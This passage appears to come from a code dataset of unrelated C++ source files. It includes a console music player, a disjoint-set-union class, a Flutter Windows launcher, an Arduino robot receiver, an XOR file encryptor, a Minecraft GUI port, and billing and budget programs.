0;\r\n\t\t\t}\r\n\t\t\trazdel();\r\n\t\t\tbreak;\r\n\t\tcase(2):\r\n\t\t\t\r\n\t\t\tstd::cout << \"(\u00d7\u00f2\u00ee\u00e1\u00fb \u00ee\u00f2\u00ea\u00f0\u00fb\u00f2\u00fc \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea \u00e2\u00fb\u00e1\u00e5\u00f0\u00e8 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e8\u00e9 \u00ef\u00f3\u00ed\u00ea\u00f2 \u00e2 \u00ed\u00e0\u00f7\u00e0\u00eb\u00e5)\" << std::endl;\r\n\t\t\tstd::cout << \"\u00ca\u00e0\u00ea \u00e2\u00fb \u00f5\u00ee\u00f2\u00e8\u00f2\u00e5 \u00e2\u00fb\u00e1\u00e8\u00f0\u00e0\u00f2\u00fc?:\" << std::endl;\r\n\t\t\tstd::cout << \"1) \u00cf\u00ee \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00fe\" << std::endl;\r\n\t\t\tstd::cout << \"2) \u00cf\u00ee \u00ed\u00ee\u00ec\u00e5\u00f0\u00f3 \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e5\" << std::endl;\r\n\t\t\tstd::cout << \"\u00c2\u00e0\u00f8 \u00e2\u00fb\u00e1\u00ee\u00f0: \";\r\n\t\t\tstd::cin >> i3;\r\n\t\t\tif (i3 == 1) {\r\n\t\t\t\tstd::cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8 \u00e8\u00ec\u00ff \u00f4\u00e0\u00e9\u00eb\u00e0(\u00e1\u00e5\u00e7 \u00f0\u00e0\u00f1\u00f8\u00e8\u00f0\u00e5\u00ed\u00e8\u00ff): \";\r\n\t\t\t\tstd::cin >> musicName;\r\n\t\t\t\tstrcpy(musicFullname, musicWay);\r\n\t\t\t\tstrcat(musicFullname, musicName);\r\n\t\t\t\tstrcat(musicFullname, musicR);\r\n\r\n\t\t\t\tPlaySoundA(musicFullname, NULL, SND_FILENAME);\r\n\r\n\t\t\t\tstrcpy(musicFullname, \"\");\r\n\t\t\t\trazdel();\r\n\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\telse if(i3 == 2){\r\n\t\t\t\tint numOfMus{};\r\n\t\t\t\tstd::cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ed\u00ee\u00ec\u00e5\u00f0 \u00ea\u00ee\u00ec\u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8: \";\r\n\t\t\t\tstd::cin >> numOfMus;\r\n\t\t\t\t\r\n\t\t\t\tif (numOfMus <= musics && numOfMus > 0) {\r\n\t\t\t\t\tstrcpy(musicFullname, musicWay);\r\n\t\t\t\t\tstrcat(musicFullname, arrFullname[numOfMus - 1]); // -1 \u00f2.\u00ea. \u00ec\u00e0\u00f1\u00f1\u00e8\u00e2 \u00f1 0 \u00ed\u00e0\u00f7\u00e8\u00ed\u00e0\u00e5\u00f2\u00f1\u00ff\r\n\r\n\t\t\t\t\tPlaySoundA(musicFullname, NULL, SND_FILENAME);\r\n\r\n\t\t\t\t\tstrcpy(musicFullname, \"\");\r\n\t\t\t\t\t\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tstd::cerr << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0: \u00ea\u00ee\u00ec\u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8 \u00f1 \u00e4\u00e0\u00ed\u00ed\u00fb\u00ec \u00ed\u00ee\u00ec\u00e5\u00f0\u00ee\u00ec \u00ed\u00e5 \u00f1\u00f3\u00f9\u00e5\u00f1\u00f2\u00e2\u00f3\u00e5\u00f2\";\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\r\n\r\n\t\t\t\trazdel();\r\n\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tstd::cerr << \"\u00ce\u00f8\u00e8\u00e1\u00ea\u00e0 \u00e2\u00e2\u00ee\u00e4\u00e0\";\r\n\r\n\t\t\t}\r\n\r\n\t\t\trazdel();\r\n\r\n\t\t\tbreak;\r\n\t\tcase(3):\r\n\t\t\tstd::cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e8\u00ec\u00ff \u00f4\u00e0\u00e9\u00eb\u00e0, \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e9 \u00f5\u00ee\u00f2\u00e8\u00f2\u00e5 \u00ef\u00e5\u00f0\u00e5\u00e8\u00ec\u00e5\u00ed\u00ee\u00e2\u00e0\u00f2\u00fc(\u00e1\u00e5\u00e7 \u00f0\u00e0\u00f1\u00f8\u00e8\u00f0\u00e5\u00ed\u00e8\u00ff): \";\r\n\t\t\tstd::cin >> musicName;\r\n\t\t\tstd::cout << \"\u00c2\u00fb\u00e1\u00e5\u00f0\u00e8\u00f2\u00e5 \u00ed\u00ee\u00e2\u00ee\u00e5 \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5(\u00e1\u00e5\u00e7 \u00f0\u00e0\u00f1\u00f8\u00e8\u00f0\u00e5\u00ed\u00e8\u00ff): \";\r\n\t\t\tstd::cin >> newMusicName;\r\n\t\t\tstrcpy(musicFullname, musicWay);\r\n\t\t\tstrcat(musicFullname, musicName);\r\n\t\t\tstrcat(musicFullname, musicR);\r\n\t\t\t\r\n\t\t\tstrcpy(newMusicFullname, musicWay);\r\n\t\t\tstrcat(newMusicFullname, newMusicName);\r\n\t\t\tstrcat(newMusicFullname, musicR);\r\n\t\t\tstd::rename(musicFullname, newMusicFullname);\r\n\t\t\t\r\n\t\t\tstrcpy(musicFullname, \"\");\r\n\t\t\tstrcpy(newMusicFullname, \"\");\r\n\t\t\t\r\n\t\t\trazdel();\r\n\t\t\tbreak;\r\n\t\tcase(4):\r\n\t\t\t\r\n\t\t\tdo {\r\n\t\t\t\tint i{};\r\n\t\t\t\tstd::cout << \"\u00cc\u00e5\u00ed\u00fe \u00ef\u00eb\u00e5\u00e9\u00eb\u00e8\u00f1\u00f2\u00ee\u00e2: \" << std::endl;\r\n\t\t\t\tstd::cout << \"1) \u00d1\u00ef\u00e8\u00f1\u00ee\u00ea \u00ef\u00eb\u00e5\u00e9\u00eb\u00e8\u00f1\u00f2\u00ee\u00e2\" << std::endl;\r\n\t\t\t\tstd::cout << \"2) \u00c2\u00fb\u00e1\u00f0\u00e0\u00f2\u00fc \u00ef\u00eb\u00e5\u00e9\u00eb\u00e8\u00f1\u00f2\" << std::endl;\r\n\t\t\t\tstd::cout << \"3) \u00cf\u00e5\u00f0\u00e5\u00e8\u00ec\u00e5\u00ed\u00ee\u00e2\u00e0\u00f2\u00fc \u00ef\u00eb\u00e5\u00e9\u00eb\u00e8\u00f1\u00f2\" << std::endl;\r\n\t\t\t\tstd::cout << \"4) \u00cd\u00e0\u00e7\u00e0\u00e4\" << std::endl;\r\n\t\t\t\tstd::cout << \"\u00c2\u00e0\u00f8 \u00e2\u00fb\u00e1\u00ee\u00f0: \";\r\n\t\t\t\tstd::cin >> i;\r\n\r\n\t\t\t\tswitch (i)\r\n\t\t\t\t{\r\n\t\t\t\tcase(1):\r\n\t\t\t\t\tif ((hFile = _findfirst(\"PLs/*\", &file)) == -1L) {\r\n\t\t\t\t\t\tstd:",
    "// Disjoint Set Union\n\n// we have a bunch of components that are represented as trees\n// components are identified by their representative, who is the root of the tree\n// we can find the component a node belongs to or combine two components together in O(1) time\n\nclass DSU\n{\n    // components are stored as trees\n    // trees should have least levels / depth as possible\n    // best case 2 levels, worst case log(n) levels\n\nprivate:\n    vector<ll> parent;\n    vector<ll> depth;\n    vector<ll> sz;\n    ll comps;\n\npublic:\n    DSU(ll n)\n    {\n        // n nodes\n        // nodes are 1-based indexed\n\n        parent.resize(n);\n        depth.resize(n);\n        sz.resize(n);\n        comps = n - 1;\n\n        iota(parent.begin(), parent.end(), 0LL);\n        fill(depth.begin(), depth.end(), 0LL);\n        fill(sz.begin(), sz.end(), 1LL);\n    };\n\n    // the representative / leader of a tree is the root of the tree\n    // find the representative of the tree which the node belongs to\n    // takes O(log(n)) time or almost O(1) time\n\n    ll find_representative(ll node)\n    {\n        if (node == parent[node])\n        {\n            return node;\n        }\n\n        return parent[node] = find_representative(parent[node]);\n    }\n\n    // union by depth\n    // join the root of smaller depth tree to the root of larger depth tree\n    // works in O(1) time\n\n    void union_trees(ll node1, ll node2)\n    {\n        ll rep1 = find_representative(node1);\n        ll rep2 = find_representative(node2);\n\n        if (rep1 != rep2)\n        {\n            if (depth[rep1] < depth[rep2])\n            {\n                swap(rep1, rep2);\n            }\n\n            parent[rep2] = rep1;\n            sz[rep1] += sz[rep2];\n\n            if (depth[rep1] == depth[rep2])\n            {\n                depth[rep1]++;\n            }\n        }\n    }\n\n    // whether node1 and node2 are in the same component or not\n\n    bool same_component(ll node1, ll node2)\n    {\n        return find_representative(node1) == find_representative(node2);\n    }\n\n    // get the size of the component\n\n    ll get_size(ll node)\n    {\n        ll rep = find_representative(node);\n        return sz[rep];\n    }\n\n    // get the number of components \n\n    ll get_no_of_comps()\n    {\n        return comps;\n    }\n};",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sazidul_test\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* Library Includes */\n#include <Arduino.h>\n#include <RF24.h>\n#include <ESP32Servo.h>\n#include \"HeaderFiles/Parameters.h\"\n\n/* Component Instantiations */\nRF24 radio(RADIO_CE, RADIO_CSN);\nServo left_motor, right_motor, weapon_motor;\n\nvoid setup(void) {\n\t/* Initialize the serial console at 115200 baud. */\n\tSerial.begin(SERIAL_BAUD);\n\twhile (!Serial) {}\n\n\t/* Verify that the NRF24L01 radio module is connected. */\n\tSerial.println(\"\\nConnecting to the radio module.\");\n\twhile (!radio.begin()) {\n\t\t/* Inform the user that there's a problem with the radio module. */\n\t\tSerial.println(\"Could not connect to the radio module.\");\n\t\twhile (true) {}\n\t}\n\n\t/* Initialize the radio module with the desired behaviour. */\n\tSerial.println(\"\\nConfiguring the radio module.\");\n\tSerial.println(\"Dynamic payloads enabled: true\");\n\tradio.enableDynamicPayloads();\n\tSerial.println(\"Acknowledgement payloads enabled: false\");\n\tradio.disableAckPayload();\n\tradio.flush_tx();\n\n\t/* Set the reading and writing pipe addresses. */\n\tSerial.print(\"RX address: \");\n\tchar const rx_address[] PROGMEM = \"ROBOT\";\n\tSerial.println(rx_address);\n\tradio.openReadingPipe(1, (uint8_t*)rx_address);\n\tSerial.print(\"TX address: \");\n\tchar const tx_address[] PROGMEM = \"CNTRL\";\n\tSerial.println(tx_address);\n\tradio.openWritingPipe((uint8_t*)tx_address);\n\n\t/* Establish a connection with the controller. */\n\tSerial.println(\"\\nConnecting to the transmitter.\");\n\tchar const init_msg[] PROGMEM = \"CombatCraftCB2\";\n\tuint8_t const channels[3] = {RADIO_CH1, RADIO_CH2, RADIO_CH3};\n\tsize_t const channel_wait = CHAN_DELAY;\n\twhile (true) {\n\t\t/* Start scanning the three radio channels cyclically. */\n\t\tradio.startListening();\n\t\tuint8_t const channel_index = (millis() / channel_wait) % 3;\n\t\tif (radio.getChannel() != channels[channel_index]) {\n\t\t\tradio.setChannel(channels[channel_index]);\n\t\t\tSerial.print(\"\\nChanging to channel \");\n\t\t\tSerial.print(channel_index+1);\n\t\t\tSerial.print(\" (\");\n\t\t\tSerial.print(channels[channel_index] + CH_TO_MHZ);\n\t\t\tSerial.println(\" MHz).\");\n\t\t}\n\n\t\t/* When a message is received, read it into memory. */\n\t\tif (!radio.available()) continue;\n\t\tuint8_t const read_length = radio.getDynamicPayloadSize();\n\t\tchar read_buffer[33];\n\t\tmemset(read_buffer, 0, 33 * sizeof(char));\n\t\tradio.read(read_buffer, read_length);\n\t\tSerial.print(\"Received: \");\n\t\tSerial.print(read_buffer);\n\t\tSerial.print(\" (Bytes: \");\n\t\tSerial.print(read_length);\n\t\tSerial.println(\")\");\n\n\t\t/* Compare the received message against the expected message. */\n\t\tif (strcmp(read_buffer, init_msg)) continue;\n\n\t\t/* If the messages matched, send a reply to the controller. */\n\t\tbool reply_succeeded;\n\t\tradio.stopListening();\n\t\tunsigned long const reply_timeout = millis() + REPLY_TIMEOUT;\n\t\twhile (millis() < reply_timeout) {\n\t\t\treply_succeeded = radio.write(read_buffer, read_length);\n\t\t\tif (reply_succeeded) break;\n\t\t\telse delay(WRITE_DELAY); \n\t\t}\n\t\tif (reply_succeeded) break;\n\t\telse Serial.println(\"Reply timed out.\");\n\t}\n\n\t/* Map each motor object to its signal output pin. */\n\tSerial.println(\"\\nAttaching motors to output pins.\");\n\tleft_motor.attach(DRIVE_LEFT);\n\tright_motor.attach(DRIVE_RIGHT);\n\tweapon_motor.attach(WEAPON);\n\n\t/* Set up the radio to send battery information to the controller. */\n\tSerial.println(\"\\nEnabling acknowledgement payloads.\");\n\tradio.flush_tx();\n\tradio.enableAckPayload();\n\tradio.startListening();\n\n\tSerial.println(\"\\nStarting remote control.\");\n}\n\nvoid loop(void) {\n\t/* If the TX FIFO is empty, load it with a battery reading. */\n\tuint16_t static battery_test = 0;\n\tif (radio.isFifo(true, true)) {\n\t\tbattery_test = analogRead(BATTERY);\n\t\tradio.writeAckPayload(1, &battery_test, sizeof(uint16_t));\n\t}\n\n\t/* Wait for a message to arrive from the controller. */\n\tunsigned long const watchdog_timeout = millis() + WATCHDOG;\n\twhile (!radio.available() && millis() < watchdog_timeout) {}\n\n\t/* If the watchdog timeout is reached, force the robot to reset. */\n\tif (!radio.available()) {\n\t\tleft_motor.detach();\n\t\tright_motor.detach();\n\t\tweapon_motor.detach();\n\t\tSerial.println(\"\\nWatchdog timer expired.\");\n\t\tSerial.println(\"Resetting robot.\");\n\t\tsetup();\n\t\treturn;\n\t}\n\n\t/* Read pulse width data from controller into memory. */\n\tuint16_t payload[3];\n\tmemset(payload, 0, 3 * sizeof(uint16_t));\n\tradio.read(payload, 3 * sizeof(uint16_t));\n\n\t/* Write updated pulse width values to motor outputs. */\n\tuint16_t const left_pulse = payload[0];\n\tuint16_t const right_pulse = payload[1];\n\tuint16_t const weapon_pulse = payload[2];\n\tleft_motor.writeMicroseconds(left_pulse);\n\tright_motor.writeMicroseconds(right_pulse);\n\tweapon_motor.writeMicroseconds(weapon_pulse);\n\n#ifdef PRINT_EXTRA\n\n\tunsigned long static packet_echo_timer = 0;\n\tif (millis() - packet_echo_timer < PRINT_INTERVAL) return;\n\telse packet_echo_timer = millis();\n\n\tSerial.println();\n\tSerial.print(\"Payload: \");\n\tSerial.print(left_pulse, HEX);\n\tSerial.print(right_pulse, HEX);\n\tSerial.print(weapon_pulse, HEX);\n\tSerial.print(\" (Bytes: \");\n\tSerial.print(3 * sizeof(uint16_t));\n\tSerial.println",
    "#include <iostream>\n#include <fstream>\n#include <string>\n\nvoid encryptFile(const std::string& filename, const std::string& password)\n{\n\tstd::ifstream inputFile(filename, std::ios::binary);\n\tstd::ofstream outputFile(filename + \".encrypted\", std::ios::binary);\n\n\tif (!inputFile)\n\t{\n\t\tstd::cerr << \"Error opening the input file.\" << std::endl;\n\t\treturn;\n\t}\n\n\tchar ch;\n\tint passwordIndex = 0;\n\twhile (inputFile.get(ch))\n\t{\n\t\tch ^= password[passwordIndex];\n\t\toutputFile.put(ch);\n\n\t\tpasswordIndex = (passwordIndex + 1) % password.size();\n\t}\n\n\tinputFile.close();\n\toutputFile.close();\n\n\tstd::cout << \"File encrypted successfully.\" << std::endl;\n}\n\nvoid decryptFile(const std::string& filename, const std::string& password)\n{\n\tstd::ifstream inputFile(filename, std::ios::binary);\n\tstd::ofstream outputFile(filename.substr(0, filename.size() - 10), std::ios::binary);\n\n\tif (!inputFile)\n\t{\n\t\tstd::cerr << \"Error opening the input file.\" << std::endl;\n\t\treturn;\n\t}\n\n\tchar ch;\n\tint passwordIndex = 0;\n\twhile (inputFile.get(ch))\n\t{\n\t\tch ^= password[passwordIndex];\n\t\toutputFile.put(ch);\n\n\t\tpasswordIndex = (passwordIndex + 1) % password.size();\n\t}\n\n\tinputFile.close();\n\toutputFile.close();\n\n\tstd::cout << \"File decrypted successfully.\" << std::endl;\n}\n\nint main()\n{\n\tstd::string filename;\n\tstd::string password;\n\n\tstd::cout << \"Enter the filename: \";\n\tstd::getline(std::cin, filename);\n\n\tstd::cout << \"Enter password: \";\n\tstd::getline(std::cin, password);\n\n\tstd::cout << \"Select operation (1: Encrypt, 2: Decrypt): \";\n\tint operation;\n\tstd::cin >> operation;\n\tstd::cin.ignore();\n\n\tif (operation == 1)\n\t{\n\t\tencryptFile(filename, password);\n\t}\n\telse if (operation == 2)\n\t{\n\t\tdecryptFile(filename + \".encrypted\", password);\n\t}\n\telse\n\t{\n\t\tstd::cout << \"Invalid choice. Exiting the program.\" << std::endl;\n\t\treturn 0;\n\t}\n\n\treturn 0;\n}\n",
    "#include \"client/gui/Gui.h\"\n\n#include \"client/Lighting.h\"\n#include \"client/gui/ScreenSizeCalculator.h\"\n\n#include \"client/Minecraft.h\"\n#include \"world/level/Level.h\"\n\n#include \"java/Runtime.h\"\n\nGui::Gui(Minecraft &minecraft) : minecraft(minecraft)\n{\n\n}\n\nvoid Gui::render(float a, bool inScreen, int_t xm, int_t ym)\n{\n\tScreenSizeCalculator ssc(minecraft.width, minecraft.height);\n\tint_t width = ssc.getWidth();\n\tint_t height = ssc.getHeight();\n\n\tFont &font = *minecraft.font;\n\n\tminecraft.gameRenderer.setupGuiScreen();\n\n\tglEnable(GL_BLEND);\n\n\t// if (minecraft.options.fancyGraphics)\n\t// \trenderVignette(minecraft.player->getBrightness(a), width, height);\n\n\t// TODO: pumpkin\n\n\t// TODO: portal\n\n\t// Inventory bar\n\tglColor4f(1.0f, 1.0f, 1.0f, 1.0f);\n\tglBindTexture(GL_TEXTURE_2D, minecraft.textures.loadTexture(u\"/gui/gui.png\"));\n\n\tblit(width / 2 - 91, height - 22, 0, 0, 182, 22);\n\tblit(width / 2 - 91 - 1 + 0 * 20, height - 22 - 1, 0, 22, 24, 22);\n\n\t// Cross\n\tglBindTexture(GL_TEXTURE_2D, minecraft.textures.loadTexture(u\"/gui/icons.png\"));\n\tglEnable(GL_BLEND);\n\tglBlendFunc(GL_ONE_MINUS_DST_COLOR, GL_ONE_MINUS_SRC_COLOR);\n\tblit(width / 2 - 7, height / 2 - 7, 0, 0, 16, 16);\n\tglDisable(GL_BLEND);\n\n\t// Health and armor\n\tbool flicker = (minecraft.player->invulnerableTime / 3) % 2 == 1;\n\tif (minecraft.player->invulnerableTime < 10)\n\t\tflicker = false;\n\n\tint_t nowHealth = minecraft.player->health;\n\tint_t lastHealth = minecraft.player->lastHealth;\n\n\trandom.setSeed(tickCount * 312871);\n\n\tif (minecraft.gameMode->canHurtPlayer())\n\t{\n\t\t// TODO ARMOR\n\t\tint_t armor = 0;\n\n\t\tfor (int_t x = 0; x < 10; x++)\n\t\t{\n\t\t\tint_t y = height - 32;\n\t\t\tif (armor > 0)\n\t\t\t{\n\t\t\t\tint_t armorX = width / 2 + 91 - x * 8 - 9;\n\t\t\t\tif (x * 2 + 1 < armor) blit(armorX, y, 34, 9, 9, 9);\n\t\t\t\tif (x * 2 + 1 == armor) blit(armorX, y, 25, 9, 9, 9);\n\t\t\t\tif (x * 2 + 1 > armor) blit(armorX, y, 16, 9, 9, 9);\n\t\t\t}\n\n\t\t\tint_t healthX = width / 2 - 91 + x * 8;\n\n\t\t\tif (nowHealth <= 4)\n\t\t\t\ty += random.nextInt(2);\n\n\t\t\tblit(healthX, y, 16 + flicker * 9, 0, 9, 9);\n\t\t\tif (flicker)\n\t\t\t{\n\t\t\t\tif (x * 2 + 1 < lastHealth) blit(healthX, y, 70, 0, 9, 9);\n\t\t\t\tif (x * 2 + 1 == lastHealth) blit(healthX, y, 79, 0, 9, 9);\n\t\t\t}\n\t\t\tif (x * 2 + 1 < nowHealth) blit(healthX, y, 52, 0, 9, 9);\n\t\t\tif (x * 2 + 1 == nowHealth) blit(healthX, y, 61, 0, 9, 9);\n\t\t}\n\t}\n\n\tLighting::turnOn();\n\tLighting::turnOff();\n\n\t// Debug text\n\tif (lwjgl::Keyboard::isKeyDown(lwjgl::Keyboard::KEY_F3))\n\t{\n\t\tfont.drawShadow(Minecraft::VERSION_STRING + u\" (\" + minecraft.fpsString + u\")\", 2, 2, 0xFFFFFF);\n\t\tfont.drawShadow(minecraft.gatherStats1(), 2, 12, 0xFFFFFF);\n\t\tfont.drawShadow(minecraft.gatherStats2(), 2, 22, 0xFFFFFF);\n\t\tfont.drawShadow(minecraft.gatherStats3(), 2, 32, 0xFFFFFF);\n\t\tfont.drawShadow(minecraft.gatherStats4(), 2, 42, 0xFFFFFF);\n\n\t\tlong_t maxMemory = Runtime::getRuntime().maxMemory();\n\t\tlong_t totalMemory = Runtime::getRuntime().totalMemory();\n\t\tlong_t freeMemory = Runtime::getRuntime().freeMemory();\n\t\tlong_t usedMemory = totalMemory - freeMemory;\n\n\t\tjstring str = u\"Used memory: \" + String::toString(usedMemory * 100 / maxMemory) + u\"% (\" + String::toString(usedMemory / 1024 / 1024) + u\"MB) of \" + String::toString(maxMemory / 1024 / 1024) + u\"MB\";\n\t\tdrawString(font, str, width - font.width(str) - 2, 2, 0xE0E0E0);\n\t\tstr = u\"Allocated memory: \" + String::toString(totalMemory * 100 / maxMemory) + u\"% (\" + String::toString(totalMemory / 1024 / 1024) + u\"MB)\";\n\t\tdrawString(font, str, width - font.width(str) - 2, 12, 0xE0E0E0);\n\n\t\tdrawString(font, u\"x: \" + String::toString(minecraft.player->x), 2, 64, 0xE0E0E0);\n\t\tdrawString(font, u\"y: \" + String::toString(minecraft.player->y), 2, 72, 0xE0E0E0);\n\t\tdrawString(font, u\"z: \" + String::toString(minecraft.player->z), 2, 80, 0xE0E0E0);\n\t\t// drawString(font, u\"xRot: \" + String::toString(minecraft.player->xRot), 2, 88, 0xE0E0E0);\n\t\t// drawString(font, u\"yRot: \" + String::toString(minecraft.player->yRot), 2, 96, 0xE0E0E0);\n\t\t// drawString(font, u\"tilt: \" + String::toString(minecraft.player->tilt), 2, 104, 0xE0E0E0);\n\t}\n\telse\n\t{\n\t\tfont.drawShadow(Minecraft::VERSION_STRING, 2, 2, 0xFFFFFF);\n\t}\n}\n\nvoid Gui::tick()\n{\n\tif (nowPlayingTime > 0) nowPlayingTime--;\n\n\ttickCount++;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <windows.h>\nusing namespace std;\n\nclass Bill{\nprivate:\n string Item;\n int Rate, Quantity;\npublic:\n Bill():Item(\"\"), Rate(0), Quantity(0){ }\n \n void setItem(string item){\n Item = item;\n }\n \nvoid setRate(int rate){\n Rate = rate;\n}\n\nvoid setQuant(int quant){\n Quantity = quant;\n}\n\nstring getItem(){\nreturn Item;\n}\n\nint getRate(){\n return Rate;\n}\n\nint getQuant(){\n return Quantity;\n}\n\n};\n\naddItem(Bill b){\nbool close = false;\nwhile(!close){\n\tint choice;\ncout<<\"\\t1.Add.\"<<endl;\ncout<<\"\\t2.close.\"<<endl;\ncout<<\"\\tEnter Choice: \";\ncin>>choice;\n\nif(choice==1){\n\tsystem(\"cls\");\nstring item;\nint rate, quant;\n\ncout<<\"\\tEnter Item Name: \";\ncin>>item;\nb.setItem(item);\n\ncout<<\"\\tEnter Rate Of Item: \";\ncin>>rate;\nb.setRate(rate);\n\ncout<<\"\\tEnter Quantity Of Item: \";\ncin>>quant;\nb.setQuant(quant);\n\nofstream out(\"D:/Bill.txt\", ios::app);\nif(!out){\n\tcout<<\"\\tError: File Can't Open!\"<<endl;\n}\nelse{\nout<<\"\\t\"<<b.getItem()<<\" : \"<<b.getRate()<<\" : \"<<b.getQuant()<<endl<<endl;\n}\nout.close();\ncout<<\"\\tItem Added Successfuly\"<<endl;\nSleep(3000);\n}\n\nelse if(choice == 2){\n\tsystem(\"cls\");\nclose = true;\ncout<<\"\\tBack To Main Menu!\"<<endl;\nSleep(3000);\n}\n}\n}\n\nprintBill(){\n\tsystem(\"cls\");\nint count = 0;\nbool close = false;\nwhile(!close){\nsystem(\"cls\");\nint choice;\ncout<<\"\\t1.Add Bill.\"<<endl;\ncout<<\"\\t2.Close Session.\"<<endl;\ncout<<\"\\tEnter Choice: \";\ncin>>choice;\n\nif(choice==1){\nstring item;\nint quant;\ncout<<\"\\tEnter Item: \";\ncin>>item;\ncout<<\"\\tEnter Quantity: \";\ncin>>quant;\n\nifstream in(\"D:/Bill.txt\");\nofstream out(\"D:/Bill Temp.txt\");\n\nstring line;\nbool found = false;\n\nwhile(getline(in, line)){\nstringstream ss;\nss<<line;\nstring itemName;\nint itemRate, itemQuant;\nchar delimiter;\nss>>itemName>>delimiter>>itemRate>>delimiter>>itemQuant;\n\nif(item ==itemName){\nfound = true;\nif(quant <= itemQuant){\nint amount = itemRate * quant;\ncout<<\"\\t Item | Rate | Quantity | Amount\"<<endl;\ncout<<\"\\t\"<<itemName<<\"\\t \"<<itemRate<<\"\\t \"<<quant<<\"\\t \"<<amount<<endl;\nint newQuant = itemQuant - quant;\nitemQuant = newQuant;\ncount +=amount;\n\nout<<\"\\t\"<<itemName<<\" : \"<<itemRate<<\" : \"<<itemQuant<<endl;\n}\nelse{\ncout<<\"\\tSorry, \"<<item<<\" Ended!\"<<endl;\n}\n}\nelse{\nout<<line<<endl;\n}\t\n}\nif(!found){\ncout<<\"\\tItem Not Available!\"<<endl;\n}\nout.close();\nin.close();\nremove(\"D:/Bill.txt\");\nrename(\"D:/Bill Temp.txt\", \"D:/Bill.txt\");\n}\nelse if(choice ==2){\nclose = true;\ncout<<\"\\tCounting Total Bill\"<<endl;\n}\nSleep(3000);\n}\nsystem(\"cls\");\ncout<<endl<<endl;\ncout<<\"\\t Total Bill ----------------- : \"<<count<<endl<<endl;\ncout<<\"\\tThanks For Shopping!\"<<endl;\nSleep(5000);\n}\n\nint main(){\nBill b;\n\nbool exit = false;\nwhile(!exit){\nsystem(\"cls\");\nint val;\n\ncout<<\"\\tWelcome To Super Market Billing System\"<<endl;\ncout<<\"\\t**************************************\"<<endl;\ncout<<\"\\t\\t1.Add Item.\"<<endl;\ncout<<\"\\t\\t2.Print Bill.\"<<endl;\ncout<<\"\\t\\t3.Exit.\"<<endl;\ncout<<\"\\t\\tEnter Choice: \";\ncin>>val;\n\nif(val==1){\nsystem(\"cls\");\naddItem(b);\t\nSleep(3000);\n}\n\nelse if(val==2){\nprintBill();\n}\n\nelse if(val==3){\n\tsystem(\"cls\");\nexit = true;\ncout<<\"\\tGood Luck!\"<<endl;\nSleep(3000);\n}\t\n}\n}\n",
    "/*\n * budgetTracker.cpp\n * budgetTracker takes your entire budget and subtracts all your expenses. \n * Huthsady Legend Boun\n * Professor Edwards\n * 14 Sept. 2024\n * Program 2\n *\n * Params:\n *  Accept input separate times for money amount and expenses\n *  output total money left\n *\n * Flowchart:\n *  begin-> welcome message-> input money amount-> subtract expenses-> output money left after subtracting all expenses-> end/loop from beginning.\n *\n *\n */ \n\n\n#include <iostream>\n#include <string>\n\nvoid budgetTracker()\n{ \n  bool        keepRunning = true; // used to keep the while loop running.\n\n  long double initialBalance;  // <-\n  long double runningBalance;  //   |\n  double      rentBill;        //   |\n  double      insuranceBill;   //   |------ variables used for storing what is inputed.\n  double      phoneBill;       //   |\n  double      groceryExpenses; //   |\n  std::string pause;           // <-\n\n\n  while (keepRunning == true) // Beginning of loop. Breakable by internal if statement.\n  {\n    std::cout << \"Welcome to the college budget tracker!\\n\" << \"Please enter your initial balance. (E.G. 837290927234328)\\n$\"; // Greeting message, balance request, and example (for preventing improper inputs)\n    std::cin >> initialBalance;\n  \n    runningBalance = initialBalance;\n\n    std::cout << \"Now, please enter your monthly rent cost\\n$\";\n    std::cin >> rentBill;\n  \n    runningBalance -= rentBill;\n\n    std::cout << \"Now enter your monthly insurance cost\\n$\";\n    std::cin >> insuranceBill;\n\n    runningBalance -= rentBill;                                                                                                // Lines 36 - 60 are the cycle of subtracting from the runningBalance\n                                                                                                                               // Also, the '$' sign after the endlines should prevent improper inputs.\n    std::cout << \"Enter your phone bill please\\n$\";\n    std::cin >> phoneBill;\n\n    runningBalance -= phoneBill;\n\n    std::cout << \"Enter your monthly grocery expenses please\\n$\";\n    std::cin >> groceryExpenses;\n    std::cout << \"Calculating your budget after all monthly expenses...\\n\";\n\n    runningBalance -= 